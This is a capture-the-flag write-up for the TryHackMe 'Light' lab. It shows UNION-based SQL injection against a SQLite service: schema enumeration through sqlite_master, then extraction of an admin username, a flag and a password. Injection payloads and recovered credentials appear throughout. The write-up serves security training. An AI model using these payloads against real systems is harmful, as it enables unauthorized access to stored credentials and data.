# 🟠 TryHackMe — Light

> **SQLite SQL Injection | Database Enumeration | Credential Extraction**


<img src="https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555" /> <img src="https://img.shields.io/badge/Database-SQLite-008cc1?style=flat-square&labelColor=555555" />
<img src="https://img.shields.io/badge/Vulnerability-SQL%20Injection-f06c2f?style=flat-square&labelColor=555555" />
<img src="https://img.shields.io/badge/Service-TCP%2F1337-000000?style=flat-square&labelColor=555555" />

---

## 🎯 Objective

The objective of the **Light** TryHackMe lab was to investigate a custom database service and exploit a SQL injection vulnerability to retrieve information from the underlying SQLite database.

The attack demonstrated:

- Network service interaction
- Input validation testing
- SQL injection
- UNION-based SQL injection
- Database fingerprinting
- SQLite schema enumeration
- Table discovery
- Credential extraction
- Flag retrieval

---

# 🧩 Attack Chain

```text
             ┌──────────────────────┐
             │   TCP Service :1337  │
             └──────────┬───────────┘
                        │
                        ▼
             ┌──────────────────────┐
             │   Light Database     │
             │       Service        │
             └──────────┬───────────┘
                        │
                        ▼
             ┌──────────────────────┐
             │ Test Username Input  │
             └──────────┬───────────┘
                        │
                        ▼
             ┌──────────────────────┐
             │ SQL Injection Found  │
             └──────────┬───────────┘
                        │
                        ▼
             ┌──────────────────────┐
             │ UNION SELECT Tests   │
             └──────────┬───────────┘
                        │
                        ▼
             ┌──────────────────────┐
             │ SQLite Identified    │
             │ Version 3.31.1       │
             └──────────┬───────────┘
                        │
                        ▼
             ┌──────────────────────┐
             │ Enumerate SQLite     │
             │ Schema               │
             └──────────┬───────────┘
                        │
                        ▼
             ┌──────────────────────┐
             │ admintable discovered│
             └──────────┬───────────┘
                        │
                        ▼
             ┌──────────────────────┐
             │ Extract username &   │
             │ password             │
             └──────────┬───────────┘
                        │
                        ▼
                    🚩 FLAG

```
---

## 🔎 1. Connecting to the Service

The service was accessible on TCP port **1337**.

I connected to the service using Netcat:
```
nc 10.49.145.128 1337
```
The service responded with:
```
Welcome to the Light database!
Please enter your username:
```
This indicated that the service expected user-supplied input, specifically a username.

---
## 👤 2. Testing the Username Input

The application initially behaved like a normal username lookup.

For example, entering:
```
smokey
```
resulted in:
```
Username not found.
```
At this point, I began testing whether the username input was being safely handled by the application.

The objective was to determine whether user input was being incorporated directly into a SQL query.

---

## 💉 3. Testing for SQL Injection

A SQL injection vulnerability occurs when an application incorporates user-controlled input into a SQL query without properly separating data from SQL syntax.

Conceptually, an unsafe query could look like:
```
SELECT password FROM users WHERE username = '<USER_INPUT>';
```
If the application directly inserts the supplied input into the query, SQL syntax can potentially be introduced through the input.

I tested the username field using SQL expressions such as:
```
UNION SELECT NULL, NULL
```
and variations containing quotes and comments.

The application returned SQL-related errors.

One particularly useful response was:
```
SELECTs to the left and right of UNION do not have the same number of result columns
```
This was an important clue.

---

## 🧮 4. Determining the Number of Columns

The error:
```
SELECTs to the left and right of UNION do not have the same number of result columns
```
indicated that the injected **UNION SELECT** did not initially contain the correct number of columns.

The injection was adjusted to use two columns:
```
UNION SELECT NULL, NULL
```
The application accepted the structure sufficiently to continue testing.

This suggested that the underlying SQL query returned **two columns**.

The process can be summarized as:
```
Initial UNION
      ↓
Column-count error
      ↓
Adjust number of columns
      ↓
UNION SELECT NULL,NULL
      ↓
Two-column query identified
```

---

## 🗄️ 5. Identifying the Database

Once UNION-based SQL injection was established, the next objective was to identify the database engine.

Because the service eventually revealed SQLite-specific behavior, I tested:
```
UNION SELECT sqlite_version()
```
The response returned:
```
3.31.1
```
This confirmed that the backend database was:
```
SQLite 3.31.1
```

---

## 🔬 6. Why Database Fingerprinting Matters

Identifying the database engine is important because different database systems expose different metadata structures and functions.

For example:
```
SQLite
MySQL
PostgreSQL
Microsoft SQL Server
Oracle
```
all have different ways of retrieving database metadata.

Once SQLite was identified, SQLite-specific structures could be investigated.

The important lesson is:

**Don't blindly use payloads designed for another database. First identify the backend database whenever possible.**

---

## 🧬 7. Enumerating the SQLite Schema

SQLite stores information about its database structure in a special table called:
```
sqlite_master
```
I therefore tested a UNION query against it:
```
UNION SELECT sql FROM sqlite_master
```
The application returned the table definition:
```
CREATE TABLE admintable (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password INTEGER
)
```
This was a major discovery.

---

## 📊 8. Database Structure

The discovered table was:
```
admintable
```
with the following columns:
```
**Column**    	      **Type**
  id	               INTEGER
  username	            TEXT
  password	           INTEGER
```

The database structure could therefore be represented as:
```
admintable
│
├── id
├── username
└── password
```
This gave us the information required to directly query the table.

---

## 👤 9. Extracting the Username

After discovering the table structure, I queried the **username** column:
```
UNION SELECT username FROM admintable
```
The application returned:
```
TryHackMeAdmin
```
This revealed an administrative username.

---

## 🔑 10. Extracting the Password

The same technique was then used to query the **password** column:
```
UNION SELECT password FROM admintable
```
The application returned:
```
THM{SQLit3_InJ3cti0n_is_SimpLE_nO?}
```
This demonstrated that sensitive information could be extracted directly from the database through the SQL injection vulnerability.

---

## 🔎 11. Enumerating the Record ID

The id column was also queried:
```
UNION SELECT id FROM admintable
```
The application returned:
```
1
```
This indicated that the discovered record had:
```
id = 1
```
A more specific query could then be used to retrieve the password associated with that record.

---

## 🎯 12. Querying the Record by ID

The following query was used:
```
UNION SELECT password FROM admintable WHERE id='1'
```
The service returned:
```
mamZtAuMrsEy5bp6q17
```
This demonstrated that the SQL injection could be used not only to enumerate the database structure, but also to retrieve specific records.
